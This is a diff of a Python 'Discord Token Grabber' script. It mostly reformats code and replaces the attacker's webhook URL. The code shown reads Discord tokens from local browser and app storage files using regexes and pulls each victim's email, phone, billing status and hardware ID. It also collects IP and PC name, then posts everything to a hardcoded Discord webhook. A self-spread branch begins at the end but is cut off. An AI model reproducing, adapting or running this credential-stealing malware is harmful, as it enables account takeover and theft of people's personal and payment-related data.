@@ -10,6 +10,7 @@ from datetime import datetime
 from threading import Thread
 from time import sleep
 from sys import argv
+
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -25,8 +26,10 @@ PATHS = {
 
 def getheaders(token=None, content_type="application/json"):
     headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+        "Content-Type":
+        content_type,
+        "User-Agent":
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
     }
     if token:
         headers.update({"Authorization": token})
@@ -35,7 +38,10 @@ def getheaders(token=None, content_type="application/json"):
 
 def getuserdata(token):
     try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+        return loads(
+            urlopen(
+                Request("https://discordapp.com/api/v6/users/@me",
+                        headers=getheaders(token))).read().decode())
     except:
         pass
 
@@ -46,8 +52,13 @@ def gettokens(path):
     for file_name in os.listdir(path):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
             continue
-        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+        for line in [
+                x.strip() for x in open(f"{path}\\{file_name}",
+                                        errors="ignore").readlines()
+                if x.strip()
+        ]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
+                          r"mfa\.[\w-]{84}"):
                 for token in findall(regex, line):
                     tokens.append(token)
     return tokens
@@ -72,36 +83,61 @@ def getavatar(uid, aid):
 
 
 def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True,
-              stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    p = Popen("wmic csproduct get uuid",
+              shell=True,
+              stdin=PIPE,
+              stdout=PIPE,
+              stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 
 
 def getfriends(token):
     try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
+        return loads(
+            urlopen(
+                Request(
+                    "https://discordapp.com/api/v6/users/@me/relationships",
+                    headers=getheaders(token))).read().decode())
     except:
         pass
 
 
 def getchat(token, uid):
     try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
+        return loads(
+            urlopen(
+                Request("https://discordapp.com/api/v6/users/@me/channels",
+                        headers=getheaders(token),
+                        data=dumps({
+                            "recipient_id": uid
+                        }).encode())).read().decode())["id"]
     except:
         pass
 
 
 def has_payment_methods(token):
     try:
-        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+        return bool(
+            len(
+                loads(
+                    urlopen(
+                        Request(
+                            "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+                            headers=getheaders(token))).read().decode())) > 0)
     except:
         pass
 
 
 def send_message(token, chat_id, form_data):
     try:
-        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages",  headers=getheaders(
-            token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+        urlopen(
+            Request(
+                f"https://discordapp.com/api/v6/channels/{chat_id}/messages",
+                headers=getheaders(
+                    token,
+                    "multipart/form-data; boundary=---------------------------325414537030329320151394843687"
+                ),
+                data=form_data.encode())).read().decode()
     except:
         pass
 
@@ -160,24 +196,23 @@ def main():
             nitro = bool(user_data.get("premium_type"))
             billing = bool(has_payment_methods(token))
             embed = {
-                "color": 0x7289da,
-                "fields": [
-                    {
-                        "name": "**Account Info**",
-                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-                        "inline": True
-                    },
-                    {
-                        "name": "**PC Info**",
-                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
-                        "inline": True
-                    },
-                    {
-                        "name": "**Token**",
-                        "value": token,
-                        "inline": False
-                    }
-                ],
+                "color":
+                0x7289da,
+                "fields": [{
+                    "name": "**Account Info**",
+                    "value":
+                    f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+                    "inline": True
+                }, {
+                    "name": "**PC Info**",
+                    "value":
+                    f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
+                    "inline": True
+                }, {
+                    "name": "**Token**",
+                    "value": token,
+                    "inline": False
+                }],
                 "author": {
                     "name": f"{username} ({user_id})",
                     "icon_url": avatar_url
@@ -191,14 +226,21 @@ def main():
     if len(working) == 0:
         working.append('123')
     webhook = {
-        "content": "",
-        "embeds": embeds,
-        "username": "Discord Token Grabber",
-        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+        "content":
+        "",
+        "embeds":
+        embeds,
+        "username":
+        "Discord Token Grabber",
+        "avatar_url":
+        "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/823116202170777630/n-EJmLjaPx6T55CGoMqRVkkjBFMf19yWSka2UsrIjLIzmAtK2Z3beM57fVSPnT62adlX",
-                        data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(
+            Request(
+                "https://discord.com/api/webhooks/965797900129017866/Lih2f7jw1I15bSf9G3qxzu3rW7cHyMT63RSUxyol5_6J0OL0_ZtTARu85ZDVhLVqa9xJ",
+                data=dumps(webhook).encode(),
+                headers=getheaders()))
     except:
         pass
     if self_spread:
